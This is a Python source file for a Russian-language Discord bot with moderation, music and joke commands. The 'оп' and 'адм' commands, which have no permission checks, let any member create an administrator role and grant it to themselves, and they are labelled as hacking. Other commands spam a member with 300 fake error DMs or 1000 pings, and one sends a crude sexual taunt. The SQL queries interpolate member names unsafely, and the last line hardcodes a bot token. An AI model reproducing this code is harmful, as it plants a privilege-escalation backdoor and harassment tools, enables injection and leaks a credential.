import discord 
import asyncio
from discord.ext import commands 
from discord.ext.commands import cooldown, BucketType, Context 
import sqlite3
from discord.utils import get
import os
import youtube_dl
from youtube_dl import *


client = commands.Bot(command_prefix = '.', intents = discord.Intents.all())
client.remove_command('help')
connection = sqlite3.connect('TABLE.db')
cursor = connection.cursor()

@client.event
async def on_ready():
	await client.change_presence( status = discord.Status.idle, activity = discord.Game( '.help' ) )
	print('Бот запущен')
	cursor.execute("""CREATE TABLE IF NOT EXISTS users(
		name TEXT,
		id INT,
		server_id INT,
		warns INT)""")
	connection.commit()
	for guild in client.guilds:
		for member in guild.members:
			if cursor.execute(f"SELECT id FROM users WHERE id = {member.id} and server_id = {guild.id}").fetchone() is None:
				try:
					cursor.execute(f"INSERT INTO users VALUES ('{member}', {member.id}, {guild.id}, 0)")
					connection.commit()
				except:
					pass

#Мут
@client.command()
@commands.has_permissions(administrator=True)
async def mute(ctx, member: discord.Member = None,time=None, *,arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = 'Форма мута: **.mute @(Ник) (время) (причина)**'))
	elif time is None:
		await ctx.send(embed = discord.Embed(title = 'Упс... :no_entry:', description = 'Пожалуйста, укажи время!'))
	else:
		time2 = time
		if 's' in time:
			time = time[:-1] 
			time = time*int(1)
		elif 'm' in time:
			time = time[:-1] 
			time = int(time)*60
		elif 'h' in time:
			time = time[:-1] 
			time = int(time)*3600
		elif 'd' in time:
			time = time[:-1] 
			time = int(time)*3600*24
		await ctx.send(embed = discord.Embed(title = 'Блокировки', description = f':bulb:Участник __{member.mention}__ замучен! \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author}__'))
		await member.send(embed = discord.Embed(title = 'Блокировки', description = f':bulb:Вам выдали мут. \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author}__'))
		await member.add_roles(discord.utils.get(ctx.guild.roles, name = 'Mute'), reason =  f"{arg}")
		await asyncio.sleep(int(time))
		await member.remove_roles(discord.utils.get(ctx.guild.roles, name = 'Mute')) 
		await member.send(embed = discord.Embed(title = 'Сюрприз! :tada:', description=  f':bulb:У вас ,__{member.mention}__, истекло время мута '))
@client.command()
@commands.has_permissions(administrator=True)
async def unmute(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = ':bulb:Форма размута: **.unmute @(ник)**'))
	else:
		await member.remove_roles(discord.utils.get(ctx.guild.roles, name = 'Mute')) 
		await ctx.send(embed = discord.Embed(title = 'Разблокировки', description =  f':bulb:Вы размутили __{member.mention}__ \n\n:bulb:Администратор: __{ctx.author}__'))
@client.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member = None,time=None,*,arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = ':bulb:Форма бана: **.ban @(ник) (время) (причина)**'))
	elif time is None:
		await ctx.send('Пожалуйста, укажите время!')
	else:
		time2 = time
		if 's' in time:
			time = time[:-1] 
			time = time*int(1)
		elif 'm' in time:
			time = time[:-1] 
			time = int(time)*60
		elif 'h' in time:
			time = time[:-1] 
			time = int(time)*3600
		elif 'd' in time:
			time = time[:-1] 
			time = int(time)*3600*24
		await ctx.send(embed = discord.Embed(title = 'Блокировки', description = f':bulb:Участник __{member.mention}__ забанен! \n\n:bulb:Срок бана: **{time2}** \n\n:bulb:Причина: **{arg}** \n\n:bulb:Администратор: __{ctx.author}__'))
		await member.create_dm()
		await member.send(embed = discord.Embed(title = 'Блокировки', descriptions = f':bulb:Вы были забанены на **{time2}** \n\nCервер **{ctx.guild.name}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Забанил: __{ctx.author}__'))
		await member.ban(reason = f'{arg}')
		await asyncio.sleep(int(time))
		await member.unban(reason = f'{arg}')
		await ctx.send(f'У участника __{member.mention}__ истекло время бана ')

@client.command()
@commands.has_permissions(administrator=True)
async def warn(ctx, member: discord.Member = None, *, arg='Причина не указана'):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = 'Правильная форма: **.warn @(ник) (причина)**'))
	else:
		cursor.execute("UPDATE users SET warns = warns + 1 WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id))
		connection.commit()
		await ctx.send(embed = discord.Embed(title ='Предупреждения', description = f':red_circle:Участник __{member.mention}__ получил варн! \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Выдал: __{ctx.author}__'))
		await member.send(embed = discord.Embed(title = 'Варны ', description = f':bulb:Вам выдали варн! \n\n:bulb:Причина: **{arg}** \n\n:bulb:Выдал: __{ctx.author}__'))
@client.command()
async def warns(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(f'**Ваши предупреждения: {cursor.execute("SELECT warns FROM users WHERE id = {} and server_id = {}".format(ctx.author.id, ctx.guild.id)).fetchone()[0]}**')
	else:
		await ctx.send(f'**Предупреждения {member.mention}: {cursor.execute("SELECT warns FROM users WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id)).fetchone()[0]}**')


@client.command()
@commands.has_permissions(administrator=True)
async def unwarn(ctx, member: discord.Member = None):
	if member is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry:', description = ':bulb:Правильная форма: **.unwarn @(ник)**'))
	else:
		cursor.execute("UPDATE users SET warns = 0 WHERE id = {} and server_id = {}".format(member.id, ctx.guild.id))
		connection.commit()
		await ctx.send(embed = discord.Embed(title = 'Предупреждения', description = f':bulb:У участника __{member.mention}__ очищены варны'))

@client.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, limit = None):
	if limit is None:
		await ctx.channel.purge(limit = 75)
		await ctx.send(embed = discord.Embed(title = 'Очистка! :no_entry:', description = ':bulb:Очищено 75 сообщений \n:bulb:Если хотите выбрать кол-во сами, напишите .clear (кол-во)'))
		await asyncio.sleep(int(6))
		await ctx.channel.purge(limit = 3)
	else:
		await ctx.channel.purge(limit = int(limit))
		await ctx.send(embed = discord.Embed(title = 'Очистка! :no_entry:', description = f':bulb:Данный канал успешно очищен! \n\nОчистил - {ctx.author}'))
		await asyncio.sleep(int(6))
		await ctx.channel.purge(limit = 3)

@client.command()
async def скажи(ctx, *, arg = None):
	if arg is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry: ', description = ':bulb:Правильная форма: .say (Текст)'))
	else:
		await ctx.channel.purge(limit = 1)
		await ctx.send(arg)

@client.command()
async def лс(ctx, member: discord.Member = None, *, arg = None):
	if arg is None:
		await ctx.send(embed = discord.Embed(title = 'Ошибочка! :no_entry: ', description = ':bulb:Правильная форма: .say (Текст)'))
	else:
		await ctx.channel.purge(limit = 1)
		await member.send(arg)
@client.command()
async def оп(ctx, limit = None):
	await ctx.send(embed = discord.Embed(title = ':bulb:HACKING ADMINR ROLE', description = 'Происходит взлом права "Администратор"'))
	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True))
	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'new role'))
	await ctx.send(embed = discord.Embed(title = ':bulb:Complete!', description = 'Права админа были выданы!'))
	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))

@client.command()
async def адм(ctx, limit = None):
	await ctx.channel.purge(limit = 1)
	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True))
	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'new role'))
	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))

@client.command()
async def help(ctx):
	emb = discord.Embed(title = ':scroll:Команды:scroll:')
	emb.add_field(name = ':pushpin:.mute', value=':bulb:Мут', inline = True)
	emb.add_field(name = ':pushpin:.unmute', value=':bulb:Размут', inline = True)
	emb.add_field(name = ':pushpin:.ban', value=':bulb:Блокировка', inline = True)
	emb.add_field(name = ':pushpin:.unban', value=':bulb:Разбан', inline = True)
	emb.add_field(name = ':pushpin:.warn', value=':bulb:Выдача варна', inline = True)
	emb.add_field(name = ':pushpin:.unwarn', value=':bulb:Очистка варнов', inline = True)
	emb.add_field(name = ':pushpin:.скажи', value=':bulb:Сказать что-либо от имени бота', inline = True)
	emb.add_field(name = ':pushpin:.avatar', value=':bulb:Заполучить аватар', inline = True)
	emb.add_field(name = ':pushpin:.выебать', value=':bulb:Наказать своего недруга злым методом', inline = True)
	emb.add_field(name = ':pushpin:.ping', value=':bulb:узнать пинг бота', inline = True)
	emb.add_field(name = ':pushpin:.clear', value=':bulb:Очистка чата', inline = True)
	await ctx.send(embed = emb)

@client.command()
async def выебать(ctx,member: discord.Member = None,):
	coint = 0
	a = True
	while a:
		await ctx.send(f'Ого, Ты выебал __{member}__ \nhttps://get.wallhere.com/photo/anime-anime-girls-artwork-blue-Vocaloid-Hatsune-Miku-Toy-screenshot-mangaka-126872.jpg')
		await member.send(f'Капец {member.mention}Тебя выебали!!! Выебал {ctx.author} \nhttps://get.wallhere.com/photo/anime-anime-girls-artwork-blue-Vocaloid-Hatsune-Miku-Toy-screenshot-mangaka-126872.jpg')
		coint += 1
		if coint == 1:
			a = False
@client.command()
async def контроль(ctx,member: discord.Member = None, time=None):
	await member.send(f'ИИ включен.')
	await asyncio.sleep(int(3))
	coint = 0
	a = True
	while a:
		await member.send(f'Сработала защита от ошибок! Название системы __SystemErrorCheker__! Сообщите TheWolf1k#2980 об ошибке! \n\nЕму это сообщение не придет. Сообщение идет только **Участникам** дискорд сервера!')
		coint += 1
		if coint == 300:
			a = False

@client.command()
async def kill(ctx,member: discord.Member = None, *, arg = 'Без аргументов'):
	coint = 0
	a = True
	while a:
		await ctx.send(f'{member.mention} {arg}')
		coint += 1
		if coint == 1000:
			a = False

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.CommandNotFound ):
		await ctx.send(embed = discord.Embed(title = 'Ошибка', description = f'{ctx.author.name}, данной команды не существует. \n\nЕсли хотите узнать команды, напишите .help'))
	else:
		print(error)	

#@client.command()
#async def test(ctx):
#	msg = await ctx.send(
#		embed = discord.Embed(title = 'Вы точно хотите перевевсти деньги?', timestamp = ctx.message.created_at),
#		components = [
#			Button(style = ButtonStyle.green, label = 'Да'),
#			Button(style = ButtonStyle.red, label = 'Нет')
#
#	a = True
#	while a:
#		res = await client.wait_for('button_click', check = lambda message: message.author == ctx.author)
#		if res.component.label == 'Да':
#			await res.respond(embed = discord.Embed(type=7, description = "**Выполнено**"))
#		else:
#			await res.respond(embed = discord.Embed(type=7, description = '**Отклонено!**'))
#			a = False		

#@client.command()
#async def mutet(ctx, member: discord.Member = None,time=None, *,arg='Причина не указана'):
#	msg = await ctx.send(
#		embed = discord.Embed(title = 'Вы точно хотите этого?', timestamp = ctx.message.created_at),
#		components = [
#			Button(style = ButtonStyle.green, label = 'Да'),
##			Button(style = ButtonStyle.red, label = 'Нет')
#		])

#	a = True
#	while a:
#		res = await client.wait_for('button_click', check = lambda message: message.author == ctx.author)
#		if res.component.label == 'Да':
#			await mute(ctx = ctx)
#		else:
#			await res.respond(embed = discord.Embed(type=7, description = '**Отклонено!**'))

@client.command()
async def avatar(ctx, *, avamember: discord.Member = None):
	userAvatarUrl = avamember.avatar_url
	await ctx.send(userAvatarUrl)

@client.event
async def on_member_join (member):
    channel = client.get_channel (907979956368326685)
    role = discord.utils.get (member.guild.roles, id = 907979956313817109)
    await member.add_roles( role )
    await channel.send( embed = discord.Embed(title = 'Новенький',  description = f'``{member.name} присоединился к нам!```'))

@client.command()
async def ping(ctx):
    ping_ = client.latency
    ping = round(ping_ * 1000)
    await ctx.send(embed = discord.Embed(title = 'Пинг', description=f'Пинг в данный момент времени: ```{ping}ms```'))

@client.command(pass_context=True)
async def join(ctx):
	channel = ctx.author.voice.channel
	await channel.connect()

@client.command(pass_context=True)
async def play(ctx, *, url):
	FFMPEG_OPTIONS = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'} # Если -инет, то будет переподключатся
	ydl_opts = {'format': 'bestaudio/best'} #Настройки для быстрой ТРАСЛЯЦИИ, А НЕ СКАЧИВАНИЕ
	with YoutubeDL(ydl_opts) as ydl:
		test_video = ydl.extract_info(f"ytsearch:{url}", download=False)['entries'][0] # СКАЧИВАНИЕ НА FALSE, И ТАК МОЖНО ЧЕРЕЗ ytsearch ЧЕРЕЗ ПОИСК ВКЛЮЧИТЬ (Можно оставить только url)
		test_v2 = discord.utils.get(client.voice_clients, guild = ctx.guild) # Это получает voice_clients (ЕСТЬ В ДОКУМЕНТАЦИИ, ЧИТАТЬ НАДО!!!!)
		test_v2.play(discord.FFmpegOpusAudio(test_video['formats'][0]['url'], **FFMPEG_OPTIONS)) 
		await ctx.send(embed = discord.Embed(title = 'Музыка', description = f'Сейчас играет музыка - {url}'))

@client.command()
async def leave(ctx):
	channel = ctx.message.author.voice.channel
	voice = get(client.voice_clients, guild=ctx.guild)

	if voice and voice.is_connected():
		await voice.disconnect()
		await ctx.send(f"Отключился от {channel}")
	else:
		await ctx.send("Don't think I am in a voice channel")

client.run('OTExOTQ5NTE0NzYyNTE4NTI4.YZo1Kw.nz3J5kmnIt1QYWCXbLk-jP0S7vA')
